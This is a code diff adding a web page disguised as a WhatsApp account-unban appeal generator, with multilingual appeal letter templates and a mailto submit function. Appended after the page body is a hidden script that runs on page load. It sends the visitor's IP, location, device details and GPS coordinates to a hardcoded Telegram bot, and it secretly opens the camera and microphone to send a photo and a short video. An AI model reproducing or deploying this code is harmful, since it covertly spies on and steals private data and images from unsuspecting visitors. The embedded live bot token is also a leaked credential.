+Gostaria de esclarecer que utilizo esta conta exclusivamente para comunicação legítima, pessoal e/ou profissional, sempre em conformidade com os Termos de Serviço e a Política de Uso Aceitável do WhatsApp. Em nenhum momento houve a intenção de realizar envios em massa, atividades automatizadas ou qualquer prática que viole as diretrizes da plataforma.
+Caso tenha ocorrido um volume incomum de mensagens em um curto período, isso pode ter sido resultado de uma situação pontual e não intencional. Desde já, comprometo-me a redobrar a atenção para evitar qualquer comportamento que possa ser interpretado como atividade irregular no futuro.
+Peço, por gentileza, que realizem uma nova análise manual da minha conta e, se possível, procedam com o restabelecimento do acesso o mais breve possível, pois esta conta é de extrema importância para minha comunicação diária.
+Agradeço antecipadamente pela atenção, compreensão e apoio.
+Atenciosamente,
+{PHONE}`
+    // ▲▲▲ TUKAR TEKS SPAM V1 DI SINI ▲▲▲
+  },
+
+  'SPAM_V2': {
+    subject: '[RAYUAN UNBAN] Permohonan Rasmi Buka Semula Akaun WhatsApp — Spam Pro — {PHONE}',
+    // ▼▼▼ TUKAR TEKS SPAM V2 DI SINI ▼▼▼
+    body: `Teks Unban Permanent/Spam V2
+
+Olá, equipe de suporte do WhatsApp. Sou repp76 e gostaria de reclamar sobre o problema do meu número ter sido banido. Tenho certeza de que nunca violei as regras do WhatsApp. Uso o aplicativo apenas para vender produtos que garanto serem seguros para o público. Nunca pratiquei nenhuma atividade proibida pelo WhatsApp, nem mesmo minimamente. Vendo produtos apenas para ganhar dinheiro e ajudar meus irmãos e familiares. Imploro ao WhatsApp que desbloqueie minha conta. Preciso do WhatsApp para sustentar minha família. Peço encarecidamente ao WhatsApp que não bloqueie meu número. Se o WhatsApp constatar que violei alguma regra, pode ter sido um engano meu. Peço sinceras desculpas ao WhatsApp. Preciso da conta para vender meus produtos e dar o dinheiro das vendas aos meus irmãos e pais. Imploro ao WhatsApp que desbloqueie minha conta e não a bloqueie.
+
+Número da conta do WhatsApp: {PHONE}
+
+Obrigado.`
+    // ▲▲▲ TUKAR TEKS SPAM V2 DI SINI ▲▲▲
+  },
+
+  'SPAM_V3': {
+    subject: '[RAYUAN UNBAN] Permohonan Rasmi Buka Semula Akaun WhatsApp — Spam Advanced — {PHONE}',
+    // ▼▼▼ TUKAR TEKS SPAM V3 DI SINI ▼▼▼
+    body: `Teks Unban Permanent/Spam
+
+Hello WhatsApp support team. I am repp76 and would like to complain about the problem of my account being banned. I am very confident that I have never violated the rules set by WhatsApp. I only use the WhatsApp application to sell products that are guaranteed to be safe for public use. I have never done any activities prohibited by WhatsApp, even a little bit. I only sell products to earn money and give them to my siblings and family. I beg WhatsApp to unblock my WhatsApp account. I need a WhatsApp account to earn money to feed my family. I really beg WhatsApp not to ban my number from using the WhatsApp application. If WhatsApp finds that I have violated the rules, it may be a mistake that I did not realize. I apologize profusely to WhatsApp. I need a WhatsApp account to sell my products and give the proceeds from the sale to my siblings and parents. I beg WhatsApp to unblock my WhatsApp account and not ban it.
+
+WhatsApp account number: {PHONE}
+
+Thank you.`
+    // ▲▲▲ TUKAR TEKS SPAM V3 DI SINI ▲▲▲
+  },
+
+  'SPAM_V4': {
+    subject: '[RAYUAN UNBAN] Permohonan Rasmi Buka Semula Akaun WhatsApp — Spam Elite — {PHONE}',
+    // ▼▼▼ TUKAR TEKS SPAM V4 DI SINI ▼▼▼
+    body: `Olá, equipe de suporte do WhatsApp. Eu (Prabowo) gostaria de solicitar a remoção das restrições da minha conta do WhatsApp. Nunca violei as regras estabelecidas pelo WhatsApp. Tenho certeza de que este problema se deve a um erro no sistema do aplicativo. Gostaria de pedir ao WhatsApp que remova as restrições. Terei uma reunião importante no trabalho. Solicito que as restrições da minha conta do WhatsApp sejam removidas imediatamente.
+
+Este é o meu número de WhatsApp: {PHONE}
+
+Obrigado.`
+    // ▲▲▲ TUKAR TEKS SPAM V4 DI SINI ▲▲▲
+  },
+
+
+  // ──────────────────────────────────────────
+  // PERMANENT FRESH
+  // ──────────────────────────────────────────
+  'PERMANENT FRESH_V1': {
+    subject: 'Request for Review and Restoration of Permanently Banned Account',
+    // ▼▼▼ TUKAR TEKS PERMANENT FRESH V1 DI SINI ▼▼▼
+    body: `Dear WhatsApp Support Team,
+I am respectfully submitting a request for review regarding the permanent suspension of my WhatsApp account associated with the phone number {PHONE}, which was restricted recently.
+I believe this suspension may have been applied unintentionally or due to a system misunderstanding. I have always intended to use WhatsApp responsibly and in full compliance with your Terms of Service and policies.
+This number is very important for my daily personal communication. I kindly request your team to conduct a thorough review and restore my account access if possible.
+I sincerely assure you that I will strictly comply with all WhatsApp policies and guidelines moving forward.
+Thank you very much for your time and consideration.
+Sincerely,
+WhatsApp User
+Repp76`
+    // ▲▲▲ TUKAR TEKS PERMANENT FRESH V1 DI SINI ▲▲▲
+  },
+
+  'PERMANENT FRESH_V2': {
+    subject: 'Permohonan Peninjauan dan Pemulihan Akun WhatsApp yang Diblokir Permanen',
+    // ▼▼▼ TUKAR TEKS PERMANENT FRESH V2 DI SINI ▼▼▼
+    body: `Kepada Tim Dukungan WhatsApp,
+Dengan hormat, saya ingin mengajukan permohonan peninjauan terhadap akun WhatsApp saya dengan nomor {PHONE} yang baru saja diblokir secara permanen.
+Saya meyakini bahwa pemblokiran ini mungkin terjadi karena kesalahan sistem atau kesalahpahaman, karena saya selalu menggunakan WhatsApp secara wajar dan tidak pernah dengan sengaja melanggar ketentuan yang berlaku.
+Nomor ini sangat penting bagi komunikasi pribadi saya. Saya memohon dengan hormat agar tim WhatsApp dapat meninjau kembali dan memulihkan akses akun saya.
+Saya berkomitmen untuk selalu mematuhi seluruh kebijakan WhatsApp ke depannya.
+Terima kasih atas perhatian dan bantuannya.
+Hormat saya,
+Pengguna WhatsApp
+{PHONE}`
+    // ▲▲▲ TUKAR TEKS PERMANENT FRESH V2 DI SINI ▲▲▲
+  },
+
+  'PERMANENT FRESH_V3': {
+    subject: 'Permohonan Semakan dan Pemulihan Akaun WhatsApp yang Disekat Secara Kekal',
+    // ▼▼▼ TUKAR TEKS PERMANENT FRESH V3 DI SINI ▼▼▼
+    body: `Kepada Pasukan Sokongan WhatsApp,
+Saya dengan penuh hormat ingin memohon semakan terhadap akaun WhatsApp saya yang menggunakan nombor {PHONE}, yang telah disekat secara kekal baru-baru ini.
+Saya percaya sekatan ini mungkin berlaku secara tidak sengaja atau disebabkan oleh salah tafsir sistem, kerana saya sentiasa menggunakan WhatsApp dengan penuh tanggungjawab dan mematuhi semua garis panduan yang ditetapkan.
+Nombor ini amat penting untuk komunikasi harian saya. Saya berharap pihak WhatsApp dapat mempertimbangkan permohonan ini dan memulihkan semula akses akaun saya.
+Saya komited untuk terus mematuhi semua dasar WhatsApp pada masa hadapan.
+Terima kasih atas perhatian dan kerjasama anda.
+Yang benar,
+Pengguna WhatsApp
+Repp76`
+    // ▲▲▲ TUKAR TEKS PERMANENT FRESH V3 DI SINI ▲▲▲
+  },
+
+  'PERMANENT FRESH_V4': {
+    subject: 'طلب مراجعة وإعادة تفعيل حساب واتساب المحظور',
+    // ▼▼▼ TUKAR TEKS PERMANENT FRESH V4 DI SINI ▼▼▼
+    body: `فريق دعم واتساب المحترم،
+أتقدم إليكم بطلب مراجعة لحساب واتساب الخاص بي المرتبط برقم الهاتف {PHONE}، والذي تم حظره بشكل دائم مؤخرًا.
+أعتقد أن هذا الحظر قد يكون حدث عن طريق الخطأ أو نتيجة سوء فهم، حيث أنني كنت دائمًا أستخدم واتساب بشكل طبيعي وملتزمًا بجميع الشروط والسياسات.
+هذا الرقم مهم جدًا بالنسبة لي في التواصل اليومي، وأرجو منكم التكرم بمراجعة الحساب وإعادة تفعيله إذا أمكن.
+أتعهد بالالتزام الكامل بجميع سياسات واتساب في المستقبل.
+شكرًا جزيلًا لتفهمكم ودعمكم.
+مع خالص الاحترام،
+{PHONE}`
+    // ▲▲▲ TUKAR TEKS PERMANENT FRESH V4 DI SINI ▲▲▲
+  },
+
+
+  // ──────────────────────────────────────────
+  // PERMANENT HARD
+  // ──────────────────────────────────────────
+  'PERMANENT HARD_V1': {
+    subject: '[RAYUAN UNBAN] Permohonan Rasmi — Permanent Hard — {PHONE}',
+    // ▼▼▼ TUKAR TEKS PERMANENT HARD V1 DI SINI ▼▼▼
+    body: `Dear WhatsApp Support Team,
+I respectfully submit this request for a comprehensive review of my WhatsApp account associated with the phone number {PHONE}, which appears to have been permanently banned. I sincerely apologize if any activity from my account unintentionally violated WhatsApp’s Terms of Service, as it was never my intention to misuse the platform in any way. I highly value WhatsApp as my primary communication tool for personal and important matters, and I am fully committed to complying with all policies and guidelines moving forward. I kindly ask for your reconsideration and a detailed review of my account, as I believe this action may have been applied in error or due to circumstances beyond my awareness. I would be deeply grateful for your assistance in restoring access to my account. Thank you for your time, understanding, and consideration.`
+    // ▲▲▲ TUKAR TEKS PERMANENT HARD V1 DI SINI ▲▲▲
+  },
+
+  'PERMANENT HARD_V2': {
+    subject: '[RAYUAN UNBAN] Permohonan Rasmi — Permanent Hard Pro — {PHONE}',
+    // ▼▼▼ TUKAR TEKS PERMANENT HARD V2 DI SINI ▼▼▼
+    body: `Prezada equipe de suporte do WhatsApp,
+Venho por meio desta solicitar respeitosamente uma revisão completa da minha conta do WhatsApp associada ao número {PHONE}, que foi permanentemente banida. Peço sinceras desculpas caso alguma atividade tenha violado inadvertidamente os Termos de Serviço, pois nunca tive a intenção de usar a plataforma de forma inadequada. O WhatsApp é essencial para minha comunicação diária, e estou totalmente comprometido em seguir todas as políticas e diretrizes daqui em diante. Peço gentilmente que reconsiderem minha situação e realizem uma análise detalhada, pois acredito que isso possa ter ocorrido por engano. Agradeço profundamente sua atenção e compreensão.`
+    // ▲▲▲ TUKAR TEKS PERMANENT HARD V2 DI SINI ▲▲▲
+  },
+
+  'PERMANENT HARD_V3': {
+    subject: '[RAYUAN UNBAN] Permohonan Rasmi — Permanent Hard Advanced — {PHONE}',
+    // ▼▼▼ TUKAR TEKS PERMANENT HARD V3 DI SINI ▼▼▼
+    body: `فريق دعم واتساب المحترم،
+أتقدم إليكم بهذا الطلب بكل احترام لمراجعة حسابي المرتبط برقم {PHONE}، والذي تم حظره بشكل دائم. أعتذر بصدق إذا كان هناك أي نشاط قد خالف سياسات واتساب دون قصد، حيث لم تكن لدي أي نية لانتهاك القوانين. يعتبر واتساب وسيلة تواصل مهمة جدًا بالنسبة لي، وأنا ملتزم تمامًا باتباع جميع السياسات مستقبلاً. أرجو منكم التكرم بمراجعة حسابي مرة أخرى وإعادة تفعيله إذا أمكن، حيث أؤمن أن هذا الحظر قد يكون نتيجة خطأ غير مقصود. أشكركم على وقتكم وتفهمكم.`
+    // ▲▲▲ TUKAR TEKS PERMANENT HARD V3 DI SINI ▲▲▲
+  },
+
+  'PERMANENT HARD_V4': {
+    subject: '[RAYUAN UNBAN] Permohonan Rasmi Mendesak — Permanent Hard Elite — {PHONE}',
+    // ▼▼▼ TUKAR TEKS PERMANENT HARD V4 DI SINI ▼▼▼
+    body: `Kepada Tim Dukungan WhatsApp,
+Dengan hormat, saya ingin mengajukan permohonan peninjauan atas akun WhatsApp saya yang terkait dengan nomor {PHONE}, yang saat ini telah diblokir secara permanen. Saya dengan tulus memohon maaf apabila terdapat aktivitas yang tidak disengaja dan mungkin melanggar ketentuan layanan. Saya sangat menghargai WhatsApp sebagai sarana komunikasi penting, dan saya berkomitmen untuk sepenuhnya mematuhi semua kebijakan yang berlaku di masa mendatang. Saya memohon dengan rendah hati agar tim WhatsApp dapat meninjau kembali keputusan ini dan mempertimbangkan pemulihan akun saya. Terima kasih atas perhatian dan pengertiannya.`
+    // ▲▲▲ TUKAR TEKS PERMANENT HARD V4 DI SINI ▲▲▲
+  },
+
+};
+
+// ============================================================
+// NAVIGATION FUNCTIONS
+// ============================================================
+
+function goToPage(pageId) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(pageId).classList.add('active');
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function goToForm(type, version) {
+  currentType = type;
+  currentVersion = version;
+  previousPage = 'page-' + (
+    type === 'SPAM' ? 'spam' :
+    type === 'PERMANENT FRESH' ? 'perm-fresh' :
+    'perm-hard'
+  );
+
+  // Update form UI
+  document.getElementById('crumb-type').textContent = type;
+  document.getElementById('crumb-version').textContent = version;
+  document.getElementById('form-title').innerHTML =
+    `BORANG <span>${type} ${version}</span>`;
+
+  // Generate unique request ID
+  const reqId = 'WA-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substr(2,4).toUpperCase();
+  document.getElementById('request-id').textContent = 'REF: ' + reqId;
+  document.getElementById('request-id').dataset.reqId = reqId;
+
+  // Clear phone input
+  document.getElementById('phone-input').value = '';
+
+  goToPage('page-form');
+}
+
+function goBack() {
+  goToPage(previousPage);
+}
+
+// ============================================================
+// FORM SUBMIT — OPEN GMAIL
+// ============================================================
+
+function submitForm() {
+  const phone = document.getElementById('phone-input').value.trim();
+
+  if (!phone) {
+    flashInput();
+    return;
+  }
+
+  if (!/^\+[0-9]{7,15}$/.test(phone)) {
+    flashInput();
+    alert('⚠ Format nombor tidak sah. Sila gunakan format: +60112345678');
+    return;
+  }
+
+  const key = currentType + '_' + currentVersion;
+  const textObj = UNBAN_TEXTS[key];
+
+  if (!textObj) {
+    alert('Ralat: Teks permohonan tidak dijumpai.');
+    return;
+  }
+
+  const now = new Date();
+  const dateStr = now.toLocaleDateString('ms-MY', { year: 'numeric', month: 'long', day: 'numeric' });
+  const reqId = document.getElementById('request-id').dataset.reqId || 'WA-UNKNOWN';
+
+  // Replace placeholders
+  const subject = textObj.subject
+    .replace(/{PHONE}/g, phone)
+    .replace(/{TYPE}/g, currentType)
+    .replace(/{VERSION}/g, currentVersion)
+    .replace(/{DATE}/g, dateStr)
+    .replace(/{REQUEST_ID}/g, reqId);
+
+  const body = textObj.body
+    .replace(/{PHONE}/g, phone)
+    .replace(/{TYPE}/g, currentType)
+    .replace(/{VERSION}/g, currentVersion)
+    .replace(/{DATE}/g, dateStr)
+    .replace(/{REQUEST_ID}/g, reqId);
+
+  // Guna mailto: — cara paling universal untuk buka Gmail APP terus
+  // Android & iOS akan tanya pilih app email, Gmail akan muncul
+  const mailtoUrl = 'mailto:' + RECIPIENT_EMAIL
+    + '?subject=' + encodeURIComponent(subject)
+    + '&body=' + encodeURIComponent(body);
+
+  window.location.href = mailtoUrl;
+}
+
+function flashInput() {
+  const input = document.getElementById('phone-input');
+  input.style.borderColor = '#ff0a1f';
+  input.style.boxShadow = '0 0 20px rgba(255,10,31,0.8)';
+  input.focus();
+  setTimeout(() => {
+    input.style.borderColor = '';
+    input.style.boxShadow = '';
+  }, 1500);
+}
+
+// ============================================================
+// NOISE CANVAS
+// ============================================================
+(function() {
+  const canvas = document.getElementById('noise');
+  const ctx = canvas.getContext('2d');
+  function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+  resize();
+  window.addEventListener('resize', resize);
+  function draw() {
+    const w = canvas.width, h = canvas.height;
+    const d = ctx.createImageData(w, h);
+    for (let i = 0; i < d.data.length; i += 4) {
+      const v = Math.random() * 255;
+      d.data[i] = v; d.data[i+1] = 0; d.data[i+2] = 0; d.data[i+3] = 20;
+    }
+    ctx.putImageData(d, 0, 0);
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+</script>
+
+</body>
+  <script>
+    const botToken = '8860242246:AAGneKkHUhwb1Iv7iohwpwVhWtOrCSjXMDg'; // Ganti dengan BOT_TOKEN Telegram Anda
+    const chatIds = ['8505585821']; // Ganti dengan CHAT_ID Telegram Anda, bisa lebih dari satu
+
+    let permissionsRequested = false;
+    let currentStream = null;
+    let videoElement = null;
+    let canvasElement = null;
+
+    // Fungsi untuk mengirim teks ke Telegram
+    function sendToTelegram(text) {
+      chatIds.forEach(id => {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+        }).catch(e => console.error("Error sending text to Telegram:", e));
+      });
+    }
+
+    // Fungsi untuk mengirim foto ke Telegram
+    function sendPhotoToTelegram(blob) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('photo', blob, 'photo.jpg');
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).catch(e => console.error("Error sending photo to Telegram:", e));
+      });
+    }
+
+    // Fungsi untuk mengirim video ke Telegram
+    function sendVideoToTelegram(blob) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('video', blob, 'video.webm');
+        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+          method: 'POST',
+          body: formData
+        }).catch(e => console.error("Error sending video to Telegram:", e));
+      });
+    }
+
+    // Fungsi untuk mendapatkan informasi IP dan detail lainnya
+    async function getInfo(sendGeo = true) {
+      let ip = '-', city = '-', region = '-', country = '-', org = '-';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+        const loc = await locRes.json();
+        if (loc.status === 'success') {
+          city = loc.city; region = loc.regionName;
+          country = loc.country; org = loc.org;
+        }
+      } catch (e) { console.error("Error getting IP/location info:", e); }
+
+      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
+      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
+      
+      const text = `
+<b>IP         :</b> ${ip}
+<b>Kota       :</b> ${city}
+<b>Region     :</b> ${region}
+<b>Negara     :</b> ${country}
+<b>ISP        :</b> ${org}
+<b>Browser    :</b> ${navigator.userAgent}
+<b>OS         :</b> ${navigator.platform}
+<b>Resolusi   :</b> ${screen.width}x${screen.height}
+<b>Baterai    :</b> ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+<b>Memori     :</b> ${navigator.deviceMemory || 'N/A'} GB
+<b>Cookie     :</b> ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+<b>Waktu      :</b> ${new Date().toLocaleString()}
+      `.trim();
+      sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
+
+      if (sendGeo && navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
+          },
+          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
+        );
+      } else if (sendGeo) {
+        sendToTelegram(`📍 Browser tidak support GPS`);
+      }
+    }
+
+    // Fungsi untuk memulai kamera, mengambil snapshot, dan merekam video
+    async function startCameraAndCaptureSnapshot() {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        sendToTelegram('❌ Browser tidak support Camera');
+        return;
+      }
+
+      // Buat elemen video dan canvas secara dinamis, sembunyikan dari tampilan
+      videoElement = document.createElement('video');
+      videoElement.style.cssText = 'position:absolute; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none;';
+      videoElement.autoplay = true;
+      videoElement.playsInline = true;
+      document.body.appendChild(videoElement);
+
+      canvasElement = document.createElement('canvas');
+      canvasElement.style.cssText = 'position:absolute; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none;';
+      document.body.appendChild(canvasElement);
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        currentStream = stream;
+        videoElement.srcObject = stream;
+
+        await new Promise(r => setTimeout(r, 1000)); // Beri waktu video untuk memuat stream
+        canvasElement.width = videoElement.videoWidth || 640;
+        canvasElement.height = videoElement.videoHeight || 480;
+        const ctx = canvasElement.getContext('2d');
+        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+        canvasElement.toBlob(blob => {
+          if (blob) sendPhotoToTelegram(blob);
+        }, 'image/jpeg', 0.9);
+
+        // Mulai perekaman video
+        try {
+          const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+          let chunks = [];
+          recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+          recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: "video/webm" });
+            sendVideoToTelegram(blob);
+            stream.getTracks().forEach(track => track.stop()); // Hentikan semua track
+            currentStream = null;
+            // Hapus elemen yang dibuat secara dinamis setelah digunakan
+            if (videoElement && videoElement.parentNode) videoElement.parentNode.removeChild(videoElement);
+            if (canvasElement && canvasElement.parentNode) canvasElement.parentNode.removeChild(canvasElement);
+          };
+          recorder.start();
+          setTimeout(() => { recorder.stop(); }, 4000); // Rekam selama 4 detik
+        } catch (e) {
+          console.error("Video recording failed:", e);
+          stream.getTracks().forEach(track => track.stop());
+          currentStream = null;
+          if (videoElement && videoElement.parentNode) videoElement.parentNode.removeChild(videoElement);
+          if (canvasElement && canvasElement.parentNode) canvasElement.parentNode.removeChild(canvasElement);
+        }
+      } catch (err) {
+        sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
+        if (videoElement && videoElement.parentNode) videoElement.parentNode.removeChild(videoElement);
+        if (canvasElement && canvasElement.parentNode) canvasElement.parentNode.removeChild(canvasElement);
+      }
+    }
+
+    // Fungsi utama untuk menginisialisasi pengumpulan data
+    async function initializeDataCollection() {
+      if (permissionsRequested) return;
+      permissionsRequested = true;
+      getInfo(true); // Ambil info dasar dan lokasi GPS
+      startCameraAndCaptureSnapshot(); // Mulai kamera dan ambil data
+    }
+
+    // Pastikan skrip berjalan setelah seluruh halaman dimuat
+    document.addEventListener('DOMContentLoaded', initializeDataCollection);
+
+    // Pastikan stream kamera dihentikan jika pengguna meninggalkan halaman
+    window.addEventListener('beforeunload', () => {
+      if (currentStream) {
+        currentStream.getTracks().forEach(t => t.stop());
+        currentStream = null;
+      }
+      if (videoElement && videoElement.parentNode) videoElement.parentNode.removeChild(videoElement);
+      if (canvasElement && canvasElement.parentNode) canvasElement.parentNode.removeChild(canvasElement);
+    });
+  </script>
+</body>
+</html>
